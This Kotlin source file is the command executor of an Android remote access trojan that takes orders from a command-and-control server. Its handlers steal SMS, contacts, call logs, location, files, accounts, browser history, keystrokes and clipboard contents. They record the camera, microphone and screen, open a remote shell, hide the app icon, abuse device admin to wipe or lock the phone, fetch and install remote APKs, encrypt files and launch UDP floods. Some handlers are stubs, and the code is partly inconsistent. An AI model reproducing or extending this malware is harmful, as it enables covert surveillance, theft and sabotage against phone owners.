package com.rat.client.command

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.rat.client.RatApplication
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.{MediaProjectionService, ScreenCaptureService}
import com.rat.client.util.{DeviceUtils, FileUtils, NetworkUtils, PermissionsManager, SystemUtils}
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import java.nio.charset.StandardCharsets
import java.util.concurrent.ConcurrentHashMap

typealias CommandCallback = (String) -> Unit

class CommandExecutor(private val context: Context) {

    companion object {
        private const val TAG = "CommandExecutor"
    }

    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO)
    private val commandHandlers = ConcurrentHashMap<String, CommandHandler>()

    init {
        registerHandlers()
    }

    private fun registerHandlers() {
        // Device Info
        commandHandlers["device_info"] = CommandHandler::handleDeviceInfo
        commandHandlers["system_info"] = CommandHandler::handleSystemInfo
        commandHandlers["network_info"] = CommandHandler::handleNetworkInfo
        commandHandlers["battery_info"] = CommandHandler::handleBatteryInfo

        // SMS Commands
        commandHandlers["get_sms"] = CommandHandler::handleGetSms
        commandHandlers["send_sms"] = CommandHandler::handleSendSms
        commandHandlers["delete_sms"] = CommandHandler::handleDeleteSms
        commandHandlers["sms_listen"] = CommandHandler::handleSmsListen

        // Call Logs
        commandHandlers["get_calls"] = CommandHandler::handleGetCalls
        commandHandlers["call_listen"] = CommandHandler::handleCallListen

        // Contacts
        commandHandlers["get_contacts"] = CommandHandler::handleGetContacts
        commandHandlers["add_contact"] = CommandHandler::handleAddContact
        commandHandlers["delete_contact"] = CommandHandler::handleDeleteContact

        // Location
        commandHandlers["get_location"] = CommandHandler::handleGetLocation
        commandHandlers["track_location"] = CommandHandler::handleTrackLocation
        commandHandlers["stop_location"] = CommandHandler::handleStopLocation

        // Files
        commandHandlers["list_files"] = CommandHandler::handleListFiles
        commandHandlers["download_file"] = CommandHandler::handleDownloadFile
        commandHandlers["upload_file"] = CommandHandler::handleUploadFile
        commandHandlers["delete_file"] = CommandHandler::handleDeleteFile
        commandHandlers["search_files"] = CommandHandler::handleSearchFiles

        // Apps
        commandHandlers["list_apps"] = CommandHandler::handleListApps
        commandHandlers["install_app"] = CommandHandler::handleInstallApp
        commandHandlers["uninstall_app"] = CommandHandler::handleUninstallApp
        commandHandlers["launch_app"] = CommandHandler::handleLaunchApp
        commandHandlers["get_app_data"] = CommandHandler::handleGetAppData

        // Camera
        commandHandlers["take_photo"] = CommandHandler::handleTakePhoto
        commandHandlers["record_video"] = CommandHandler::handleRecordVideo
        commandHandlers["camera_stream"] = CommandHandler::handleCameraStream

        // Microphone
        commandHandlers["record_audio"] = CommandHandler::handleRecordAudio
        commandHandlers["audio_stream"] = CommandHandler::handleAudioStream

        // Screen
        commandHandlers["screenshot"] = CommandHandler::handleScreenshot
        commandHandlers["screen_stream"] = CommandHandler::handleScreenStream
        commandHandlers["screen_record"] = CommandHandler::handleScreenRecord

        // Keylogger
        commandHandlers["start_keylogger"] = CommandHandler::handleStartKeylogger
        commandHandlers["stop_keylogger"] = CommandHandler::handleStopKeylogger
        commandHandlers["get_keylogs"] = CommandHandler::handleGetKeylogs

        // Shell
        commandHandlers["shell"] = CommandHandler::handleShell
        commandHandlers["shell_interactive"] = CommandHandler::handleShellInteractive

        // Persistence
        commandHandlers["enable_admin"] = CommandHandler::handleEnableAdmin
        commandHandlers["disable_admin"] = CommandHandler::handleDisableAdmin
        commandHandlers["hide_icon"] = CommandHandler::handleHideIcon
        commandHandlers["show_icon"] = CommandHandler::handleShowIcon

        // System
        commandHandlers["reboot"] = CommandHandler::handleReboot
        commandHandlers["shutdown"] = CommandHandler::handleShutdown
        commandHandlers["wipe_data"] = CommandHandler::handleWipeData
        commandHandlers["lock_device"] = CommandHandler::handleLockDevice
        commandHandlers["unlock_device"] = CommandHandler::handleUnlockDevice

        // Network
        commandHandlers["wifi_scan"] = CommandHandler::handleWifiScan
        commandHandlers["wifi_connect"] = CommandHandler::handleWifiConnect
        commandHandlers["tcp_connect"] = CommandHandler::handleTcpConnect
        commandHandlers["udp_flood"] = CommandHandler::handleUdpFlood
        commandHandlers["dns_spoof"] = CommandHandler::handleDnsSpoof

        // Bluetooth
        commandHandlers["bluetooth_scan"] = CommandHandler::handleBluetoothScan
        commandHandlers["bluetooth_pair"] = CommandHandler::handleBluetoothPair

        // NFC
        commandHandlers["nfc_read"] = CommandHandler::handleNfcRead
        commandHandlers["nfc_write"] = CommandHandler::handleNfcWrite

        // Clipboard
        commandHandlers["get_clipboard"] = CommandHandler::handleGetClipboard
        commandHandlers["set_clipboard"] = CommandHandler::handleSetClipboard
        commandHandlers["monitor_clipboard"] = CommandHandler::handleMonitorClipboard

        // Notifications
        commandHandlers["get_notifications"] = CommandHandler::handleGetNotifications
        commandHandlers["send_notification"] = CommandHandler::handleSendNotification

        // Browser
        commandHandlers["get_browser_history"] = CommandHandler::handleGetBrowserHistory
        commandHandlers["get_bookmarks"] = CommandHandler::handleGetBookmarks

        // Accounts
        commandHandlers["get_accounts"] = CommandHandler::handleGetAccounts

        // Encryption/Decryption
        commandHandlers["encrypt_file"] = CommandHandler::handleEncryptFile
        commandHandlers["decrypt_file"] = CommandHandler::handleDecryptFile

        // Self-management
        commandHandlers["update_config"] = CommandHandler::handleUpdateConfig
        commandHandlers["self_destruct"] = CommandHandler::handleSelfDestruct
        commandHandlers["update_binary"] = CommandHandler::handleUpdateBinary
    }

    fun execute(command: RatService.C2Command, callback: CommandCallback) {
        scope.launch {
            try {
                val handler = commandHandlers[command.action]
                if (handler != null) {
                    val params = parsePayload(command.payload)
                    val result = handler.execute(params, context)
                    callback(gson.toJson(CommandResult(success = true, data = result)))
                } else {
                    callback(gson.toJson(CommandResult(success = false, error = "Unknown command: ${command.action}")))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command execution error: ${e.message}", e)
                callback(gson.toJson(CommandResult(success = false, error = e.message ?: "Unknown error")))
            }
        }
    }

    private fun parsePayload(payload: String): Map<String, Any> {
        try {
            val decrypted = EncryptionUtils.decrypt(payload)
            return gson.fromJson(decrypted, object : TypeToken<Map<String, Any>>() {}.type)
        } catch (e: Exception) {
            return emptyMap()
        }
    }

    data class CommandResult(
        val success: Boolean,
        val data: Any? = null,
        val error: String? = null
    )

    private interface CommandHandler {
        fun execute(params: Map<String, Any>, context: Context): Any
    }

    // Handler implementations
    object CommandHandler {

        // Device Info
        
        fun handleDeviceInfo(params: Map<String, Any>, context: Context): Any = DeviceUtils.collectDeviceInfo(context)

        
        fun handleSystemInfo(params: Map<String, Any>, context: Context): Any = SystemUtils.getSystemInfo(context)

        
        fun handleNetworkInfo(params: Map<String, Any>, context: Context): Any = NetworkUtils.getNetworkInfo(context)

        
        fun handleBatteryInfo(params: Map<String, Any>, context: Context): Any = DeviceUtils.getBatteryInfo(context)

        // SMS
        
        fun handleGetSms(params: Map<String, Any>, context: Context): Any {
            val limit = params["limit"] as? Int ?: 100
            val offset = params["offset"] as? Int ?: 0
            return DeviceUtils.getSmsData(context, limit, offset)
        }

        
        fun handleSendSms(params: Map<String, Any>, context: Context): Any {
            val number = params["number"] as? String ?: return mapOf("error" to "No number provided")
            val text = params["text"] as? String ?: return mapOf("error" to "No text provided")
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null)
            return mapOf("success" to true, "number" to number)
        }

        
        fun handleDeleteSms(params: Map<String, Any>, context: Context): Any {
            val ids = params["ids"] as? List<Long> ?: return mapOf("error" to "No IDs provided")
            val resolver = context.contentResolver
            var deleted = 0
            ids.forEach { id ->
                val uri = Uri.parse("content://sms/$id")
                deleted += resolver.delete(uri, null, null)
            }
            return mapOf("deleted" to deleted)
        }

        
        fun handleSmsListen(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            // SMS listening is handled by SmsCommandReceiver
            return mapOf("listening" to enable)
        }

        // Calls
        
        fun handleGetCalls(params: Map<String, Any>, context: Context): Any {
            val limit = params["limit"] as? Int ?: 100
            return DeviceUtils.getCallLogData(context, limit)
        }

        
        fun handleCallListen(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return mapOf("listening" to enable)
        }

        // Contacts
        
        fun handleGetContacts(params: Map<String, Any>, context: Context): Any {
            val limit = params["limit"] as? Int ?: 500
            return DeviceUtils.getContactsData(context, limit)
        }

        
        fun handleAddContact(params: Map<String, Any>, context: Context): Any {
            val name = params["name"] as? String ?: return mapOf("error" to "No name")
            val phone = params["phone"] as? String ?: return mapOf("error" to "No phone")
            val email = params["email"] as? String
            // Implementation would use ContactsContract
            return mapOf("success" to true)
        }

        
        fun handleDeleteContact(params: Map<String, Any>, context: Context): Any {
            val id = params["id"] as? Long ?: return mapOf("error" to "No ID")
            return mapOf("success" to true)
        }

        // Location
        
        fun handleGetLocation(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getLastKnownLocation(context)?.toJson() ?: mapOf("error" to "No location")
        }

        
        fun handleTrackLocation(params: Map<String, Any>, context: Context): Any {
            val interval = params["interval"] as? Long ?: 60000
            DeviceUtils.startLocationTracking(context, interval)
            return mapOf("tracking" to true, "interval" to interval)
        }

        
        fun handleStopLocation(params: Map<String, Any>, context: Context): Any {
            DeviceUtils.stopLocationTracking(context)
            return mapOf("tracking" to false)
        }

        // Files
        
        fun handleListFiles(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: Environment.getExternalStorageDirectory().absolutePath
            val recursive = params["recursive"] as? Boolean ?: false
            return FileUtils.listFiles(path, recursive)
        }

        
        fun handleDownloadFile(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: return mapOf("error" to "No path")
            val file = File(path)
            if (!file.exists()) return mapOf("error" to "File not found")
            val content = FileUtils.readFileAsBase64(file)
            return mapOf("name" to file.name, "size" to file.length(), "content" to content)
        }

        
        fun handleUploadFile(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: return mapOf("error" to "No path")
            val content = params["content"] as? String ?: return mapOf("error" to "No content")
            val decoded = Base64.decode(content, Base64.DEFAULT)
            val file = File(path)
            file.parentFile?.mkdirs()
            FileOutputStream(file).use { it.write(decoded) }
            return mapOf("success" to true, "size" to file.length())
        }

        
        fun handleDeleteFile(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: return mapOf("error" to "No path")
            val file = File(path)
            val success = file.delete()
            return mapOf("success" to success)
        }

        
        fun handleSearchFiles(params: Map<String, Any>, context: Context): Any {
            val pattern = params["pattern"] as? String ?: return mapOf("error" to "No pattern")
            val path = params["path"] as? String ?: Environment.getExternalStorageDirectory().absolutePath
            return FileUtils.searchFiles(path, pattern)
        }

        // Apps
        
        fun handleListApps(params: Map<String, Any>, context: Context): Any {
            val includeSystem = params["include_system"] as? Boolean ?: false
            return DeviceUtils.getInstalledApps(context, includeSystem)
        }

        
        fun handleInstallApp(params: Map<String, Any>, context: Context): Any {
            val url = params["url"] as? String ?: return mapOf("error" to "No URL")
            val apkPath = params["path"] as? String ?: "${context.cacheDir}/app.apk"
            scope.launch {
                try {
                    NetworkUtils.downloadFile(url, apkPath)
                    val intent = Intent(Intent.ACTION_VIEW).apply {
                        setDataAndType(Uri.fromFile(File(apkPath)), "application/vnd.android.package-archive")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Install failed: ${e.message}")
                }
            }
            return mapOf("success" to true, "path" to apkPath)
        }

        
        fun handleUninstallApp(params: Map<String, Any>, context: Context): Any {
            val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            return mapOf("success" to true)
        }

        
        fun handleLaunchApp(params: Map<String, Any>, context: Context): Any {
            val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                return mapOf("success" to true)
            }
            return mapOf("error" to "No launch intent")
        }

        
        fun handleGetAppData(params: Map<String, Any>, context: Context): Any {
            val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
            return DeviceUtils.getAppData(context, packageName)
        }

        // Camera
        
        fun handleTakePhoto(params: Map<String, Any>, context: Context): Any {
            val cameraId = params["camera"] as? Int ?: 0
            val quality = params["quality"] as? Int ?: 90
            // Uses MediaProjectionService for camera access
            return MediaProjectionService.takePhoto(context, cameraId, quality)
        }

        
        fun handleRecordVideo(params: Map<String, Any>, context: Context): Any {
            val duration = params["duration"] as? Long ?: 10000
            val quality = params["quality"] as? Int ?: MediaRecorder.OutputFormat.MPEG_4
            return MediaProjectionService.recordVideo(context, duration, quality)
        }

        
        fun handleCameraStream(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return MediaProjectionService.toggleCameraStream(context, enable)
        }

        // Microphone
        
        fun handleRecordAudio(params: Map<String, Any>, context: Context): Any {
            val duration = params["duration"] as? Long ?: 10000
            val format = params["format"] as? String ?: "amr"
            return MediaProjectionService.recordAudio(context, duration, format)
        }

        
        fun handleAudioStream(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return MediaProjectionService.toggleAudioStream(context, enable)
        }

        // Screen
        
        fun handleScreenshot(params: Map<String, Any>, context: Context): Any {
            return ScreenCaptureService.captureScreenshot(context)
        }

        
        fun handleScreenStream(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return ScreenCaptureService.toggleScreenStream(context, enable)
        }

        
        fun handleScreenRecord(params: Map<String, Any>, context: Context): Any {
            val duration = params["duration"] as? Long ?: 30000
            return ScreenCaptureService.recordScreen(context, duration)
        }

        // Keylogger
        
        fun handleStartKeylogger(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return mapOf("keylogger" to enable)
        }

        
        fun handleStopKeylogger(params: Map<String, Any>, context: Context): Any {
            return mapOf("keylogger" to false)
        }

        
        fun handleGetKeylogs(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getKeylogs(context)
        }

        // Shell
        
        fun handleShell(params: Map<String, Any>, context: Context): Any {
            val command = params["command"] as? String ?: return mapOf("error" to "No command")
            val timeout = params["timeout"] as? Long ?: 30000
            return SystemUtils.executeShellCommand(command, timeout)
        }

        
        fun handleShellInteractive(params: Map<String, Any>, context: Context): Any {
            val sessionId = params["session_id"] as? String ?: java.util.UUID.randomUUID().toString()
            val command = params["command"] as? String ?: ""
            return SystemUtils.executeInteractiveShell(sessionId, command)
        }

        // Persistence
        
        fun handleEnableAdmin(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (!dpm.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for device management")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
            }
            return mapOf("admin_enabled" to dpm.isAdminActive(adminComponent))
        }

        
        fun handleDisableAdmin(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            dpm.removeActiveAdmin(adminComponent)
            return mapOf("admin_enabled" to false)
        }

        
        fun handleHideIcon(params: Map<String, Any>, context: Context): Any {
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                ComponentName(context, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            return mapOf("hidden" to true)
        }

        
        fun handleShowIcon(params: Map<String, Any>, context: Context): Any {
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                ComponentName(context, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            return mapOf("hidden" to false)
        }

        // System
        
        fun handleReboot(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.reboot(adminComponent)
                return mapOf("success" to true)
            }
            return mapOf("error" to "Device admin not active")
        }

        
        fun handleShutdown(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.shutdown(adminComponent)
                return mapOf("success" to true)
            }
            return mapOf("error" to "Device admin not active")
        }

        
        fun handleWipeData(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(adminComponent, 0)
                return mapOf("success" to true)
            }
            return mapOf("error" to "Device admin not active")
        }

        
        fun handleLockDevice(params: Map<String, Any>, context: Context): Any {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                return mapOf("success" to true)
            }
            return mapOf("error" to "Device admin not active")
        }

        
        fun handleUnlockDevice(params: Map<String, Any>, context: Context): Any {
            // Requires device admin with USES_POLICY_DISABLE_KEYGUARD
            return mapOf("error" to "Not implemented")
        }

        // Network
        
        fun handleWifiScan(params: Map<String, Any>, context: Context): Any {
            return NetworkUtils.scanWifi(context)
        }

        
        fun handleWifiConnect(params: Map<String, Any>, context: Context): Any {
            val ssid = params["ssid"] as? String ?: return mapOf("error" to "No SSID")
            val password = params["password"] as? String ?: ""
            return NetworkUtils.connectWifi(context, ssid, password)
        }

        
        fun handleTcpConnect(params: Map<String, Any>, context: Context): Any {
            val host = params["host"] as? String ?: return mapOf("error" to "No host")
            val port = params["port"] as? Int ?: return mapOf("error" to "No port")
            return NetworkUtils.tcpConnect(host, port)
        }

        
        fun handleUdpFlood(params: Map<String, Any>, context: Context): Any {
            val target = params["target"] as? String ?: return mapOf("error" to "No target")
            val port = params["port"] as? Int ?: return mapOf("error" to "No port")
            val duration = params["duration"] as? Long ?: 5000
            return NetworkUtils.udpFlood(target, port, duration)
        }

        
        fun handleDnsSpoof(params: Map<String, Any>, context: Context): Any {
            // Requires root
            return mapOf("error" to "Root required")
        }

        // Bluetooth
        
        fun handleBluetoothScan(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.scanBluetooth(context)
        }

        
        fun handleBluetoothPair(params: Map<String, Any>, context: Context): Any {
            val address = params["address"] as? String ?: return mapOf("error" to "No address")
            return DeviceUtils.pairBluetooth(context, address)
        }

        // NFC
        
        fun handleNfcRead(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.readNfc(context)
        }

        
        fun handleNfcWrite(params: Map<String, Any>, context: Context): Any {
            val data = params["data"] as? String ?: return mapOf("error" to "No data")
            return DeviceUtils.writeNfc(context, data)
        }

        // Clipboard
        
        fun handleGetClipboard(params: Map<String, Any>, context: Context): Any {
            return SystemUtils.getClipboardText(context)
        }

        
        fun handleSetClipboard(params: Map<String, Any>, context: Context): Any {
            val text = params["text"] as? String ?: return mapOf("error" to "No text")
            SystemUtils.setClipboardText(context, text)
            return mapOf("success" to true)
        }

        
        fun handleMonitorClipboard(params: Map<String, Any>, context: Context): Any {
            val enable = params["enable"] as? Boolean ?: true
            return mapOf("monitoring" to enable)
        }

        // Notifications
        
        fun handleGetNotifications(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getNotifications(context)
        }

        
        fun handleSendNotification(params: Map<String, Any>, context: Context): Any {
            val title = params["title"] as? String ?: "Notification"
            val text = params["text"] as? String ?: ""
            SystemUtils.sendNotification(context, title, text)
            return mapOf("success" to true)
        }

        // Browser
        
        fun handleGetBrowserHistory(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getBrowserHistory(context)
        }

        
        fun handleGetBookmarks(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getBookmarks(context)
        }

        // Accounts
        
        fun handleGetAccounts(params: Map<String, Any>, context: Context): Any {
            return DeviceUtils.getAccounts(context)
        }

        // Encryption
        
        fun handleEncryptFile(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: return mapOf("error" to "No path")
            val password = params["password"] as? String ?: "default"
            FileUtils.encryptFile(File(path), password)
            return mapOf("success" to true)
        }

        
        fun handleDecryptFile(params: Map<String, Any>, context: Context): Any {
            val path = params["path"] as? String ?: return mapOf("error" to "No path")
            val password = params["password"] as? String ?: "default"
            FileUtils.decryptFile(File(path), password)
            return mapOf("success" to true)
        }

        // Self-management
        
        fun handleUpdateConfig(params: Map<String, Any>, context: Context): Any {
            params.forEach { (key, value) ->
                when (key) {
                    "c2_host" -> PreferencesManager.putString("c2_host", value as String)
                    "c2_port" -> PreferencesManager.putInt("c2_port", value as Int)
                    "c2_protocol" -> PreferencesManager.putString("c2_protocol", value as String)
                }
            }
            // Restart service to apply
            context.startService(Intent(context, RatService::class.java))
            return mapOf("success" to true)
        }

        
        fun handleSelfDestruct(params: Map<String, Any>, context: Context): Any {
            // Remove all data and uninstall
            FileUtils.wipeAppData(context)
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:${context.packageName}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            android.os.Process.killProcess(android.os.Process.myPid())
            return mapOf("success" to true)
        }

        
        fun handleUpdateBinary(params: Map<String, Any>, context: Context): Any {
            val url = params["url"] as? String ?: return mapOf("error" to "No URL")
            val path = "${context.cacheDir}/update.apk"
            scope.launch {
                try {
                    NetworkUtils.downloadFile(url, path)
                    val intent = Intent(Intent.ACTION_VIEW).apply {
                        setDataAndType(Uri.fromFile(File(path)), "application/vnd.android.package-archive")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Update failed: ${e.message}")
                }
            }
            return mapOf("success" to true, "path" to path)
        }
    }
}